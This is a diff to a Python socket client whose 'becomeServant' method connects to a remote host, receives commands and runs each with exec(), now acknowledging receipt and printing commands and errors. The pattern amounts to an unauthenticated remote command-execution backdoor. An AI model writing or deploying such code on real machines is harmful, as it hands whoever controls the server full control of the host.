@@ -9,6 +9,7 @@ class client:
         self.port=port
         self.recv = recv
         self.quiet = quiet
+        self.dataWasSent=True
         #Init
         self.soc = Socket.socket(Socket.AF_INET, Socket.SOCK_STREAM)
         self.soc.connect((self.ip_addr, self.port))
@@ -21,7 +22,9 @@ class client:
         if not self.quiet:
             print(msg)
     def sendData(self,data):
-        self.soc.sendall(data)
+        data=str(data)
+        self.soc.sendall(data.encode())
+        self.dataWasSent=True
     def closeConn(self):
         self.soc.close()
     def becomeServant(self):
@@ -31,11 +34,14 @@ class client:
                 self.log("[%s]>>>%s"%(self.ip_addr,command.decode()))
                 command = str(command.decode())
                 #print("---------------------------------------------------------")
-                #print(command)
+                print(command)
                 #print("---------------------------------------------------------")
                 exec(command)
+
+                self.sendData("[%s Recieved OK]"%str(self.ip_addr))
+                #self.dataWasSent = False
             except BaseException as error:
-                #print("ERRRRRRR"+str(error))
+                print("ERRRRRRR"+str(error))
                 self.log("[Error for command] %s"%error )
 
 if __name__ == "__main__":
